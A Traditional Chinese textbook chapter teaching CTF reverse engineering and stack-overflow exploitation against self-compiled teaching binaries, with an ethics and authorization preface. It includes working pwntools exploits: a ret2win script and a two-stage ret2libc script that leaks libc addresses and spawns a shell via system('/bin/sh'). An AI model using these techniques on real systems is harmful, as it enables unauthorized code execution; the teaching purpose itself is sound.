逆向工程與二進位攻防

一個沒有原始碼的執行檔,在你眼前其實是一本沒有目錄、沒有變數名、用機器語言寫成的天書。而一塊只有 64 bytes 的緩衝區,卻可能成為攻擊者改寫整個程式「下一步去哪」的入口。這一章,我們戴上白帽,潛進二進位的最底層——學會像逆向工程師一樣讀懂機器,像 Pwn 玩家一樣看穿記憶體,然後,像工程師一樣把這些洞補起來。

兩種最硬核的題:讀懂它,和控制它

前面幾章,我們在 CTF 的世界裡熱身過了:解過編碼、玩過密碼學、撈過封包。但每一場像樣的 CTF, 分數最高、賽到最後一刻還在被攻克的,幾乎總是這兩類題:逆向工程(Reverse Engineering,常簡稱 Rev) 與 Pwn(二進位利用,binary exploitation)。它們難,是因為它們沒有捷徑—— 你必須真的理解一台電腦在最底層是怎麼運作的。

這兩類題,可以用兩個動詞分得清清楚楚。逆向,是「讀懂」:別人給你一個編譯好的執行檔, 沒有原始碼、沒有註解、連變數名都被剝光,你要逆著編譯的方向,把它還原成「人看得懂的邏輯」—— 它在算什麼?通關密碼藏在哪?Pwn,是「控制」:程式裡有一個記憶體漏洞, 你要餵它一段精心設計的輸入,讓它去做原作者從沒打算讓它做的事——跳去執行一段隱藏的程式碼、甚至開出一個 shell。

你會發現,這一章其實是一場「回到底層」的大團圓。第 21 章我們親手讀懂過機器碼, 知道「指令也只是數字」、認得 CPU 的暫存器;第 24 章我們看清了行程的記憶體佈局、堆疊與堆積; 第 36 章我們從防禦者的角度,理解了緩衝區溢位為什麼能通往「任意程式碼執行」。 這一章,我們把鏡頭轉到攻擊者這一側——但目的始終如一:唯有親手走過攻擊的每一步, 你才會真正明白每一道防線在擋什麼。

動筆之前,先把這條線畫清楚

這一章教你看穿二進位程式、利用記憶體漏洞。這些能力的正當用途只有兩個: 把你自己(與你受僱保護)的系統寫得更安全,以及在明確獲得授權的範圍內做安全測試。 本章所有範例,都是你自己用 gcc 編譯出來的小程式、或 CTF 平台 刻意提供給你練習的題目。未經授權去探測、攻擊任何不屬於你的系統,即使「只是看看」、 即使沒造成損害,在絕大多數司法管轄區都是犯罪。我們刻意只示範針對教學靶機的手法, 不提供能直接拿去打真實系統的完整武器。這條倫理與法律的界線,我們在第 41 章「倫理」 已經正式深入——請把它當成這一章的前提,而不是註腳。

逆向工程入門:讀懂一本沒有目錄的天書

逆向的第一課,是接受一個有點殘酷的事實:編譯,是一道幾乎不可逆的門。 你寫的 C 原始碼裡,函式有名字、變數有意義、迴圈有結構;但 gcc 把它翻成機器碼之後, 這些「給人看的資訊」絕大部分都被丟掉了。剩下的,只是一長串 CPU 指令的位元組。 逆向工程師的工作,就是拿著這串位元組,把那些被丟掉的意義,一點一點推回來。

編譯後的程式,到底長什麼樣?

在 Linux 上,編譯出來的執行檔是 ELF(Executable and Linkable Format)格式。 它不是純粹的程式碼,而是一個有結構的檔案:裡面分成好幾個「節區(section)」——程式碼放在 .text、初始化過的全域變數放在 .data、字串常數放在 .rodata…… 逆向的第一步,往往就是先認一認這個檔案的長相: 

# 先確認這是什麼檔(看它的類型、位元數、有沒有被 strip 掉符號)
$ file crackme
crackme: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped

# 列出檔案裡所有可見的「節區」
$ readelf -S crackme        # 你會看到 .text / .data / .rodata / .bss ...

這裡有個關鍵詞:stripped(被剝除符號)。如果一個執行檔「not stripped」,代表它還留著函式名、 變數名等符號資訊,逆向起來輕鬆很多;真實世界的惡意程式則幾乎都是 stripped 的,只剩光禿禿的位址。 CTF 的入門逆向題,通常善意地留著符號——但別習慣,難題會把這份善意收回去。

靜態分析:不執行它,光看就猜

靜態分析(static analysis),是「在不執行程式的前提下」分析它。最快、最廉價的第一招, 是 strings——它把檔案裡所有「看起來像人類可讀字串」的位元組通通撈出來: 

$ strings crackme | grep -i -E "pass|flag|correct|wrong"
Enter password:
Correct!
Nope, wrong password.

運氣好的話,旗(flag)或密碼會直接躺在裡面,題目秒解。但好題目不會這麼天真——上面這個 crackme, 你看得到「Enter password:」「Correct!」這些提示語,卻看不到密碼,也看不到旗。 這是出題者刻意的反制:把秘密「藏起來,執行時才算出來」。這也帶出逆向的核心心法: 光靠 strings 不夠時,你得真的去讀程式的邏輯。

讀邏輯有兩個層次的工具。低階一點的是 objdump,把機器碼反組譯(disassemble) 成組合語言——這正是第 21 章那套「指令也只是數字」的逆操作: 

# 反組譯,只看 main 附近(Intel 語法比較好讀)
$ objdump -d -M intel crackme | less
# 你會看到一連串像這樣的指令:
#   mov    eax, DWORD PTR [rbp-0x4]
#   xor    al, 0x10                  ← 咦?每個位元組都 XOR 0x10?
#   cmp    ...
#   call   strcmp

看到 xor al, 0x10 出現在一個迴圈裡、後面接著 call strcmp,有經驗的逆向者心裡就有譜了: 「正確密碼被 XOR 0x10 加密藏起來,程式執行時先解開,再跟你的輸入比對。」 這就是為什麼 strings 看不到明文——它在檔案裡是被 XOR 過的亂碼。

但純讀組合語言很燒腦。更高階的工具是反編譯器(decompiler),最有名的免費選擇是 NSA 開源的 Ghidra(商業界則是 IDA Pro;命令列愛好者有 radare2)。它能把組合語言再往上推一層, 還原成近似的 C 程式碼。把 crackme 丟進 Ghidra 自動分析,找到 main,你會看到類似這樣的偽 C: 

/* Ghidra 反編譯 main 的(經整理的)結果 —— 變數名是工具自己編的 */
int main(void) {
    char input[64];
    /* 一串寫死在程式裡的位元組:其實就是被加密的密碼 */
    unsigned char enc[] = {0x62, 0x23, 0x66, 0x23, 0x62, 0x63, 0x21, 0x7e, 0x77, 0x00};
    char pw[16];
    int i;

    for (i = 0; enc[i] != 0; i++)
        pw[i] = enc[i] ^ 0x10;          /* ← 還原密碼:每個位元組 XOR 0x10 */
    pw[i] = '\0';

    printf("Enter password: ");
    scanf("%15s", input);

    if (strcmp(input, pw) == 0)          /* ← 比對的那一刻,pw 裡就是明文密碼 */
        printf("Correct! FLAG{%s_unlocked_by_reversing}\n", pw);
    else
        printf("Nope, wrong password.\n");
    return 0;
}

邏輯一旦攤開,破解就是國中數學了:把那串 enc 的每個位元組各自 XOR 0x10,就還原出密碼。 例如第一個 0x62 ^ 0x10 = 0x72,是字元 'r';一路算下去,得到 r3v3rs1ng。 你也看懂了旗為什麼 strings 看不到——它是用 printf("... FLAG{%s ...", pw) 在執行時才組出來的,根本不以完整字串的形式存在於檔案裡。

💡
逆向的「靜態」三件套

file(這是什麼檔)→ strings(有沒有現成線索)→ objdump / Ghidra / radare2(讀邏輯)。 先用最便宜的招,撈不到再升級。記住:逆向高手不是「把每一條指令都讀懂」,而是知道該把注意力放在哪—— 找到 strcmp、if 的判斷點、可疑的 xor / 迴圈,順著資料流走。

動態分析:讓它跑,然後在關鍵時刻喊「定格」

靜態分析像看劇本;動態分析(dynamic analysis)則是看現場演出。 我們真的執行程式,但用除錯器(debugger)把它牢牢控制住—— 最經典的就是 Linux 上的 gdb(CTF 圈常加掛 pwndbg 或 gef 外掛,介面更友善)。 除錯器最強大的能力,是斷點(breakpoint):讓程式跑到某一行就「定格」, 此時你可以翻看所有暫存器、所有記憶體的當下內容。

對付上面這個 crackme,動態分析有一招近乎作弊的妙計:我根本不必看懂解密邏輯—— 我只要在「比對的那一刻」把正確答案偷看出來就好。因為程式一定要把明文密碼算出來、 才能拿去 strcmp 比對,所以我在 strcmp 設個斷點,等它停下,直接讀它的參數: 

$ gdb ./crackme
(gdb) break strcmp        # 在「比對」這個函式被呼叫前斷下來
(gdb) run
Enter password: AAAA      # 隨便輸入,反正我們要的是「正確答案」,不是通過
                          # ── 程式在 strcmp 前定格 ──
(gdb) x/s $rsi            # 看 strcmp 的第二個參數(rsi 暫存器):正是程式算出的正確密碼
0x7fffffffe2b0:  "r3v3rs1ng"

密碼 r3v3rs1ng 就這樣被「現行犯」抓住了。拿去換旗: 

$ ./crackme
Enter password: r3v3rs1ng
Correct! FLAG{r3v3rs1ng_unlocked_by_reversing}
🧠
暫存器快速複習(呼應第 21 章)

看懂 x/s $rsi 為什麼能抓到答案,你得記得 x86-64 的「呼叫慣例(calling convention)」: 函式的前幾個參數,不是放在堆疊上,而是放在固定的暫存器裡——依序是 rdi(第 1 個)、rsi(第 2 個)、rdx、rcx、r8、r9。 所以 strcmp(input, pw) 被呼叫時,rdi 指向你的輸入、rsi 指向正確密碼。 其他常客:rax 放回傳值與運算結果,rsp 是堆疊指標(指向堆疊頂), rbp 是框架指標,rip 是指令指標(CPU 下一條要執行的指令位址)—— 這個 rip,等一下會是整個 Pwn 故事的主角。

⚠️
逆向給程式設計師的一課:用戶端藏不住秘密

這個 crackme 把密碼「XOR 0x10 藏起來」,看起來很聰明,但對逆向者只是幾分鐘的工。 這帶出一條鐵律:任何「跑在使用者機器上」的程式裡的秘密,終究會被挖出來。 軟體授權碼、API 金鑰、前端寫死的密碼——只要程式碼在對方手上,混淆(obfuscation)只能拖延,不能阻止。 真正的秘密與驗證,必須留在你能控制的伺服器端(呼應第 36 章的「敏感資訊外洩」)。

✏️ 練習 72.1 實作

你拿到一個自己編譯的 crackme(就是上面那個)。請描述一條完整、最省力的破解路徑: 從你會下哪些指令,到你如何拿到密碼。要求至少示範「靜態撈線索」與「動態抓答案」兩種思路各一。

看解答

路徑一(靜態,讀邏輯還原):

$ file crackme                 # 確認是 ELF 64-bit
$ strings crackme | grep -i pass   # 只看到提示語,沒密碼 → 秘密被藏了
# 用 Ghidra 開,看 main:發現一個 enc[] 位元組陣列被 for 迴圈 XOR 0x10 後拿去 strcmp
# → 把 enc 每個位元組 XOR 0x10 還原:
enc = [0x62,0x23,0x66,0x23,0x62,0x63,0x21,0x7e,0x77]
print("".join(chr(b ^ 0x10) for b in enc))   # → r3v3rs1ng

路徑二(動態,直接偷看):不必看懂解密邏輯,只要在比對那一刻把正確答案讀出來:

$ gdb ./crackme
(gdb) break strcmp
(gdb) run                      # 隨便輸入 AAAA
(gdb) x/s $rsi                 # strcmp 第二參數 = 正確密碼 → "r3v3rs1ng"

兩條路殊途同歸。動態那條尤其體現逆向的精髓:你不需要理解全部,只需要在對的位置、對的時刻, 讓程式把答案吐給你。最後 ./crackme 輸入密碼即得旗。

記憶體與堆疊:Pwn 的地基

逆向讓你「讀懂」程式;接下來的 Pwn,要「控制」程式。但在動手之前,我們得先把舞台看清楚: 一個正在執行的程式(也就是行程,process),它的記憶體到底長什麼樣? 這部分第 24 章已經鋪墊過,這裡我們戴上攻擊者的眼鏡,重看一遍——因為 Pwn 的每一招, 都是在這張記憶體地圖上動手腳。

行程的記憶體佈局:一張由低到高的地圖

當作業系統把你的程式載入記憶體、開始執行,它會給這個行程一塊虛擬位址空間(virtual address space)。 這塊空間由低位址到高位址,大致分成幾個區域,各有各的脾氣:

Stack frame:函式呼叫留下的腳印

Pwn 的主戰場,是堆疊(stack)。每當一個函式被呼叫,系統就在堆疊上替它劃出一塊 堆疊框架(stack frame)——這個函式的「私人辦公桌」,放它的區域變數、以及兩樣關鍵的「行政紀錄」。 函式結束(return)時,這塊框架就被收回。

這裡有個一開始很反直覺、但你必須牢牢記住的事實:堆疊是往「低位址」生長的。 也就是說,每呼叫一層新函式,堆疊頂(rsp 所指)就往更小的位址移動。 但陣列、緩衝區的寫入,卻是往「高位址」方向填的(buf[0]、buf[1]…… 位址遞增)。 這「一低一高」的方向差,正是緩衝區溢位能搆到返回位址的關鍵——我們馬上會看到。

大小端:同一個數字,擺法不只一種

在動手寫 exploit 之前,還有一個小但致命的細節:位元組序(endianness,大小端)。 當你要把一個位址(比如 8 bytes 的 0x0000000000401156)寫進記憶體,該怎麼擺它的 8 個位元組? x86-64 用的是小端序(little-endian):最低位的位元組放在最低的位址。 所以 0x401156 在記憶體裡實際的位元組順序是: 

數值:   0x 00 00 00 00 00 40 11 56
記憶體:  56 11 40 00 00 00 00 00       ← 低位址在左,反過來擺!

手動處理這個翻轉很容易出錯——幸好,pwntools 的 p64()(pack 64-bit)會自動幫你把一個整數 轉成正確的小端 8-byte 字串;反向的 u64()(unpack)則把讀回來的 8 個位元組還原成整數。 這對函式,等一下會是你寫 exploit 時最常打的兩個字。

用 gdb 親眼看溢位「蓋掉旁邊的變數」

理論講夠了,來看一個最小、最直觀的溢位現場。下面這支自編譯的教學程式 stack_demo.c, 用一個 struct 把 buf 和一個 authenticated 旗標綁在一起 (這樣能保證 buf 在前、authenticated 緊接在後,跨編譯器都可靠地相鄰): 

// stack_demo.c —— 看見「溢位蓋掉旁邊的變數」
// 編譯:gcc -fno-stack-protector -o stack_demo stack_demo.c
#include <stdio.h>

int main(void) {
    struct {
        char buf[16];
        int  authenticated;     // 緊接在 buf 後面(offset 16)
    } s;
    s.authenticated = 0;        // 一開始:沒有權限

    printf("buf 位址          = %p\n", (void *)s.buf);
    printf("authenticated 位址 = %p\n", (void *)&s.authenticated);
    printf("Enter your name: ");
    scanf("%s", s.buf);         // ⚠️ %s 不限長度 → 可溢位

    if (s.authenticated)        // 非 0 就「升級成 admin」
        printf("Welcome admin! FLAG{stack_overflow_overwrote_the_variable}\n");
    else
        printf("一般使用者,無權限。\n");
    return 0;
}

buf 只有 16 bytes,而 scanf("%s", ...) 跟 gets 一樣完全不檢查長度 (這正是第 36 章點名的經典地雷)。正常輸入沒事;但只要輸入夠長,多出來的位元組就會 溢出 buf、寫進緊鄰的 authenticated: 

$ ./stack_demo
buf 位址          = 0x7fffffffe2a0
authenticated 位址 = 0x7fffffffe2b0     # 差 16 bytes
Enter your name: alice
一般使用者,無權限。                       # 正常:authenticated 還是 0

$ ./stack_demo
Enter your name: AAAAAAAAAAAAAAAAAAAA    # 20 個 A(超過 16)
Welcome admin! FLAG{stack_overflow_overwrote_the_variable}

為什麼是 17 個字以上才生效?因為填滿 16 個字剛好填滿 buf,第 17 個位元組起才寫進 authenticated。 用 gdb 可以親眼看到 authenticated 被 A(也就是 0x41)染色: 

$ gdb ./stack_demo
(gdb) break 18                 # 在 if (s.authenticated) 那行斷下
(gdb) run
Enter your name: AAAAAAAAAAAAAAAAAAAA
(gdb) p s                      # 看整個 struct
$1 = {buf = "AAAAAAAAAAAAAAAA", authenticated = 0x41414141}   # ← 被 A 蓋成非 0!
(gdb) x/8xw s.buf              # 以 word(4 bytes)檢視:0x41 一路蓋過去
0x7fffffffe2a0: 0x41414141  0x41414141  0x41414141  0x41414141
0x7fffffffe2b0: 0x41414141  ...         ← 這格就是 authenticated

這就是 Pwn 的「啊哈」時刻:沒有長度檢查的輸入,會讓資料「寫出界」,蓋掉記憶體裡的鄰居。 在這個例子,我們蓋掉的是一個小小的權限旗標。但如果鄰居不是普通變數,而是返回位址呢? 那我們蓋掉的,就不只是一個值,而是程式「下一步要去哪」的決定權——這就是下一節的主題。

✏️ 練習 72.2 實作

有一個自編譯的函式如下。請(a)畫出它的 stack frame(從低位址的 buf 到高位址的返回位址,標出各部分大小); (b)算出「從 buf 開頭寫到返回位址」需要幾個位元組(也就是 offset);(c)說明這個 offset 為什麼不是單純等於陣列大小。

void vuln(void) {
    char buf[64];
    read(0, buf, 0x100);   // 最多讀 256 bytes 進只有 64 bytes 的 buf
}
看解答

(a) stack frame(由低到高):

低位址 ┌──────────────────────────┐  ← rsp(堆疊頂),buf[0] 在這
       │  char buf[64]            │  64 bytes
       ├──────────────────────────┤
       │  存起來的 rbp(舊框架指標) │   8 bytes
       ├──────────────────────────┤
       │  返回位址 return address  │   8 bytes  ← 寫到這裡就劫持流程
高位址 └──────────────────────────┘  ← 回到 main()

(b) offset = 64 + 8 = 72。從 buf[0] 開始,要先填滿 64 bytes 的 buf, 再蓋掉 8 bytes 的「存起來的 rbp」,接著第 73 個 byte 起,寫的就是返回位址。

(c) 為什麼不是 64?因為 buf 和返回位址之間,還夾著編譯器存起來的 舊框架指標(saved rbp,8 bytes)。所以要多加這 8。 (有時編譯器還會為了對齊塞入額外的填充 bytes,所以 offset 最可靠的求法, 是用工具實測——這是下一節的 cyclic 技巧。)

緩衝區溢位 I:ret2win——把返回位址改成「贏」

現在我們把溢位的目標,從「旁邊的變數」升級成「返回位址」。這類入門 Pwn 題有個經典名字叫 ret2win(return-to-win):題目裡藏著一個永遠不會被正常呼叫的「勝利函式」 (慣例叫 win(),它會印出旗或開 shell),你的任務,就是讓程式 return 時 「跳去」那個函式。我們用這支自編譯的 vuln.c 當靶: 

// vuln.c —— ret2win 教學靶機
// 編譯:gcc -fno-stack-protector -no-pie -o vuln vuln.c
//   -no-pie:讓 win 的位址固定好找;-fno-stack-protector:關掉金絲雀
#include <stdio.h>
#include <unistd.h>

void win(void) {                       // ← 永遠不會被正常呼叫的「勝利函式」
    puts("流程被你劫持了!這是你的旗:");
    puts("FLAG{ret2win_overwrite_the_return_address}");
}

void vuln(void) {
    char buf[64];
    puts("送你一段輸入,盡量塞:");
    read(0, buf, 0x100);               // ⚠️ 讀最多 256 bytes 進 64 bytes 的 buf
    puts("掰掰~");
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;
}

第一步:checksec——先看清楚對手開了什麼防護

Pwn 的第一個動作,永遠是用 checksec(pwntools 內建)檢查這個執行檔開了哪些保護機制。 這決定了你能用什麼招: 

$ checksec --file=./vuln
    Arch:     amd64-64-little          # 64 位元、小端
    RELRO:    Partial RELRO
    Stack:    No canary found          # 沒有金絲雀 → 可以安全地蓋過返回位址
    NX:       NX enabled               # 堆疊不可執行(這題用不到 shellcode,沒差)
    PIE:      No PIE (0x400000)        # 程式載入位址固定 → win 的位址是定值,好找

對 ret2win 來說,這是一手好牌:沒有 canary(蓋返回位址不會被擋)、No PIE (win 的位址固定,不必猜)。這些「防護全關」是教學刻意的安排;下一節我們會看到, 真實題目把它們打開後,難度會陡升——而那,正是這些防護的價值所在。

第二步:用 cyclic 系統化地找出 offset

我們在練習 72.2 心算過 offset = 72。但與其瞎猜、與其擔心編譯器偷塞了填充位元組, 專業做法是用 pwntools 的 cyclic:它產生一段「每 4 個字元都獨一無二」的字串 (aaaabaaacaaad...)。把它餵進去,程式崩潰時返回位址會被某 4 個 byte 蓋掉; 我們看崩潰時的暫存器內容,反查那 4 個 byte 在原字串的位置,就精準得到 offset: 

$ cyclic 200                   # 產生 200 字的不重複序列
aaaabaaacaaadaaaeaaaf...
$ gdb ./vuln
(gdb) run                      # 把上面那串貼進去
# ── 程式崩在 ret,因為返回位址變成了一段 cyclic ──
(gdb) x/gx $rsp                # 看堆疊頂被蓋成什麼
0x7fffffffe2c8: 0x6161617461616173
(gdb) cyclic -l 0x6161617461616173    # 反查這 8 byte 在序列裡的位置
72                              # ← offset 確認是 72

第三步:取得 win 的位址,組出 payload

因為這題 No PIE,win 的位址是固定的,直接查符號表就行: 

$ nm vuln | grep win           # 或 objdump -d vuln | grep '<win>'
0000000000401156 T win

現在 payload 的配方一目了然:填 72 個垃圾位元組墊到返回位址,然後放上 win 的位址 (記得用 p64 轉成小端)。等 vuln() 執行 ret,CPU 就會「跳去」win。

第四步:用 pwntools 寫出 exploit

手動用 echo 拼小端位元組既痛苦又易錯。Pwn 的標準工具是 pwntools—— 一個 Python 函式庫,把「啟動題目、收送資料、打包位址」全包辦了。完整的 ret2win exploit 短得驚人: 

# solve.py —— ret2win 教學題的 exploit(只對你自己編譯的 vuln 有效)
from pwn import *

e  = ELF("./vuln")              # 載入執行檔,讀它的符號表
io = process("./vuln")         # 在本機啟動這支程式;授權遠端題改成 remote(host, port)

OFFSET = 72                    # buf(64) + 存起來的 rbp(8);用 cyclic 確認過
win    = e.symbols["win"]      # 直接查 win 的位址(No PIE,位址固定)
log.info("win @ %#x", win)

payload  = b"A" * OFFSET       # 1) 墊到返回位址
payload += p64(win)            # 2) 用小端把 win 的位址蓋上去

io.sendline(payload)           # 送出
io.interactive()              # 接管互動 → 應印出 FLAG{ret2win_overwrite_the_return_address}
⚠️
最常見的坑:堆疊 16-byte 對齊(movaps)

你照上面打,有時會發現程式跳進 win 後,卻在裡面的 puts/printf 崩潰。 這通常不是你算錯,而是 x86-64 的一條規矩:呼叫某些函式時,堆疊指標必須對齊到 16 的倍數 (否則 movaps 這類指令會出錯)。我們的 payload 改變了堆疊的對齊。 解法很簡單:在 win 前面多塞一個「什麼都不做、只執行一次 ret」的小工具,把堆疊推回對齊:

ret = ROP(e).find_gadget(["ret"])[0]      # 找一個單獨的 ret 指令位址
payload = b"A" * OFFSET + p64(ret) + p64(win)   # 多墊一個 ret 再跳 win

這個「找一小段現成指令來用」的動作,就是 ROP 的雛形——下一節登場。

🔑
ret2win 的本質,就是第 36 章那條因果鏈的「實作」

第 36 章我們從防禦者角度說過:「能寫入記憶體」會升級成「能改寫程式下一步去哪」。 ret2win 就是這句話的最小可運作版本:沒有邊界檢查的 read/gets(資料越界) → 越界資料蓋到返回位址(改寫控制流程)→ ret 跳去攻擊者選的函式(劫持執行)。 看懂這條鏈,你就同時看懂了「為什麼一定要做邊界檢查」。攻擊與防禦,是同一枚硬幣的兩面。

✏️ 練習 72.3 挑戰

給你一支自己編譯的 ret2win 靶機:有一個 char buf[40] 的 vuln() 用 gets(buf) 讀輸入,另有一個藏起來的 void win(void) 會印旗。checksec 顯示 No canary、No PIE。請寫出 pwntools exploit 的骨架(假設 offset 已用 cyclic 確認為 48), 並說明每一行在做什麼。

看解答 
from pwn import *

e  = ELF("./vuln")             # 載入 ELF,等下要查 win 的位址
io = process("./vuln")        # 本機啟動靶機(授權遠端題:io = remote("host", port))

OFFSET = 48                   # buf(40) + 存起來的 rbp(8) = 48;已用 cyclic 驗證
win    = e.symbols["win"]     # No PIE → win 位址固定,直接查符號表

# 若遇到 movaps 對齊問題,改成:
#   ret = ROP(e).find_gadget(["ret"])[0]
#   payload = b"A"*OFFSET + p64(ret) + p64(win)
payload = b"A" * OFFSET + p64(win)   # 墊 48 + 蓋上 win 的位址(小端)

io.sendline(payload)          # 送出 payload
io.interactive()             # 接管互動,讀取印出的 FLAG{...}

關鍵觀念:OFFSET 是「從 buf 寫到返回位址要幾個 byte」,p64(win) 是 「蓋上去的新返回位址(小端打包)」。整個攻擊只有「填到返回位址、換成 win」這一句話。 這只對你自己編譯、刻意留漏洞的靶機有效——真實程式會開啟下一節的各種防護。

緩衝區溢位 II:保護機制與 ret2libc

ret2win 之所以那麼順,是因為我們把所有防護都關了。但你現在用的這台電腦, 編譯器和作業系統其實疊了好幾道防線,專門對付這類攻擊。理解這些防線「各擋什麼」, 是這一節的重點——也是第 36 章那個「現代防護三層網」的深入版。

四道現代防線:它們各自防什麼

保護機制它做什麼擋住哪種攻擊繞過的概念
Stack Canary
(堆疊金絲雀)		 在返回位址前放一個隨機「哨兵值」,函式返回前檢查它有沒有被改動,被改就立刻終止程式。 用連續溢位蓋過返回位址——因為要蓋到返回位址,一定會先踩爛中間的 canary。 想辦法先洩漏 canary 的值,再把它原封不動填回去(較進階)。
NX / DEP
(資料不可執行)		 把堆疊、堆積標記成「不可執行」。CPU 拒絕把這些區域的資料當成指令來跑。 把機器碼(shellcode)塞進 buf 再跳過去執行——資料區不可執行,直接崩。 不自己帶程式碼,改去借用程式裡既有的程式碼(ret2libc / ROP)。
ASLR
(位址空間隨機化)		 每次執行,都把堆疊、堆積、共享函式庫(libc)隨機擺到不同位址。 事先寫死某個位址(如 system 的位址)——因為每次都不一樣,猜不到。 先洩漏一個真實位址,用「固定的偏移差」反推出其他位址。
PIE
(位置無關執行檔)		 把 ASLR 也套用到程式本體:連你自己的函式(如 win)位址每次都變。 ret2win 那種「直接查 win 固定位址」的玩法。 先洩漏程式本體的某個位址,再算出 win 的真正位址。
🛡️
這四道防線,是「減災」而非「根治」

注意上表每一列都有「繞過的概念」——這正說明:這些防護大幅提高攻擊成本,但都不是無敵的。 它們的價值,在於把「填幾個 A 就能贏」的入門攻擊,變成「要先洩漏位址、再串好幾個步驟」的高難度工程。 但真正的根治,永遠是第 36 章那句話:一開始就別寫出越界——做邊界檢查、用安全函式, 或乾脆改用記憶體安全的語言(Rust、Go)。防護是給「萬一還是寫錯了」的安全網,不是不寫邊界檢查的藉口。

當 NX 擋住 shellcode:改用 ret2libc

早年的 Pwn 玩法,是把一段機器碼(shellcode,通常是「開一個 shell」的指令)塞進 buf, 再把返回位址指向它。但 NX 一開,這條路就斷了——堆疊不可執行,你塞的資料跳過去也跑不動。 於是有了一個漂亮的轉念:既然不能「自己帶程式碼」,那就「借用程式裡已經有的程式碼」。

借誰的?幾乎每支 C 程式都會連結到 libc(C 標準函式庫),而 libc 裡正好有一個威力無窮的函式: system()。如果我們能讓程式去執行 system("/bin/sh"),就等於開出一個 shell。 這個手法叫 ret2libc(return-to-libc):不跳去自己的 win,而是跳去 libc 的 system。 但這裡卡著一個 ASLR 的難關——libc 每次載入的位址都不同,我們事先不知道 system 在哪。

兩階段攻擊:先洩漏,再開 shell

破解 ASLR 的標準思路,是分兩階段:第一階段先「問」程式某個函式的真實位址, 利用 libc 內部「函式之間的偏移差是固定的」這個事實,反推出整個 libc 的載入基底(base); 第二階段再用算出的位址,呼叫 system("/bin/sh")。

下面是這套兩階段攻擊的 pwntools 骨架(針對自編譯、NX on、No PIE 的 vuln2 教學靶機)。 重點是讀懂結構,不必背 API: 

# ret2libc 教學骨架(概念示意,僅對自編譯的 vuln2 有效)
from pwn import *

e    = ELF("./vuln2")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")   # 你系統的 libc 路徑可能不同
io   = process("./vuln2")

OFFSET  = 72
rop     = ROP(e)
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]   # 「把下一個值放進 rdi」的現成小工具
RET     = rop.find_gadget(["ret"])[0]              # 對齊用

# ── 階段一:用 puts 印出 puts 自己的真實位址,藉此算出 libc 基底(繞 ASLR)──
payload = flat(
    b"A" * OFFSET,
    POP_RDI, e.got["puts"],    # rdi = puts 在 GOT 裡的位址(= puts 的真實位址)
    e.plt["puts"],             # 呼叫 puts(...) → 印出那個真實位址
    e.symbols["vuln"],         # 印完回到 vuln,等第二段
)
io.sendline(payload)
leak = u64(io.recvline().strip().ljust(8, b"\x00"))   # 收回洩漏的位址,還原成整數
libc.address = leak - libc.symbols["puts"]            # libc 基底 = 洩漏值 − puts 偏移
log.success("libc base = %#x", libc.address)

# ── 階段二:ret2libc 呼叫 system("/bin/sh") ──
binsh = next(libc.search(b"/bin/sh\x00"))             # libc 裡現成的字串 "/bin/sh"
payload2 = flat(
    b"A" * OFFSET,
    RET,                       # 多一個 ret 對齊堆疊(movaps)
    POP_RDI, binsh,            # rdi = "/bin/sh"
    libc.symbols["system"],    # system("/bin/sh")
)
io.sendline(payload2)
io.interactive()              # 拿到 shell 後:cat flag.txt
🧩
ROP,一句話

你注意到 pop rdi; ret 這種「借一小段現成指令」的招數了嗎?把許多這種以 ret 結尾的小片段(叫 gadget)像串珠子一樣串起來,就能在「完全不注入任何新程式碼」 的前提下,拼湊出任意的運算邏輯——這就是 ROP(Return-Oriented Programming,返回導向程式設計)。 ret2libc 是 ROP 最簡單的特例(只串了「設參數 + 跳 system」)。ROP 是繞過 NX 的萬用鑰匙, 也是現代 Pwn 的核心技術;它的進階(找 gadget、串長鏈、繞 canary/PIE)是一整個世界, 留待你在 pwn.college 這類平台繼續鑽研。

✏️ 練習 72.4 思考

用你自己的話,分別解釋 NX、ASLR、Stack Canary 各自擋住哪一種攻擊手法, 以及為什麼光靠其中一個還不夠、要三個一起上。

看解答
  • NX(資料不可執行):擋的是「把 shellcode(機器碼)塞進 buf 再跳去執行」這招—— 堆疊被標成不可執行,CPU 拒絕跑那裡的資料。但它擋不住 ret2libc / ROP, 因為那些手法是去執行程式裡既有的、本來就可執行的程式碼,沒有「執行資料區」。
  • ASLR(位址隨機化):擋的是「事先寫死位址」——既然每次 libc/堆疊位址都不同, 攻擊者就沒法把 system 的位址寫死在 payload 裡。但它擋不住「先洩漏一個位址再反推」: 只要程式有任何能吐出位址的管道(如 ret2libc 階段一的 puts),隨機化就被打穿。
  • Stack Canary(金絲雀):擋的是「用連續溢位蓋過返回位址」——因為要蓋到返回位址, 必先踩爛中間的隨機哨兵值,函式返回前一檢查就終止。但它擋不住「能讀取/洩漏 canary」的漏洞, 也擋不住不經過「連續覆蓋」的攻擊(如某些任意位址寫)。

為什麼要一起上?因為它們各防一面,且彼此互補:NX 逼你改用 ROP,而 ROP 需要知道位址—— 這時 ASLR + PIE 又逼你得先洩漏位址;就算你想直接蓋返回位址,canary 又先攔你一道。 三者疊加,把攻擊從「填幾個 A」拉高成「要同時擁有一個洩漏漏洞 + 一個溢位漏洞 + 精密計算」的高門檻工程。 這就是第 36 章「縱深防禦」在二進位層級的體現。

✏️ 練習 72.5 思考

解釋 ret2libc 為什麼非得「分兩階段」不可。具體說明:第一階段在做什麼、為什麼需要它? 第二階段又怎麼用第一階段的成果?如果題目關掉了 ASLR,還需要第一階段嗎?

看解答

為什麼分兩階段:因為 ASLR 讓 libc(以及 system、"/bin/sh") 每次執行的位址都不同,攻擊者事先不知道要跳去哪。

  • 第一階段(洩漏):利用溢位,讓程式呼叫它自己就有的 puts, 去印出某個已知函式(例如 puts 本身)的真實執行期位址。 因為 libc 內部「函式之間的偏移差是固定的」,知道一個真實位址,就能算出 libc 基底 = 洩漏值 − 該函式在 libc 裡的偏移。印完位址後,讓流程回到有漏洞的函式, 準備接收第二段輸入。
  • 第二階段(拿 shell):有了 libc 基底,就能算出 system 與 "/bin/sh" 字串的真實位址,再發一次溢位 payload:用 pop rdi; ret 把 "/bin/sh" 設成參數, 然後跳到 system,完成 system("/bin/sh"),開出 shell。

如果關掉 ASLR:那麼 libc 位址每次都一樣、是定值,你可以直接查出 system 與 "/bin/sh" 的位址寫死在 payload 裡——就不需要第一階段的洩漏了,一發入魂。 這也再次說明:ASLR 的唯一作用,就是逼出「洩漏」這個額外步驟;一旦關掉,攻擊難度大幅下降。

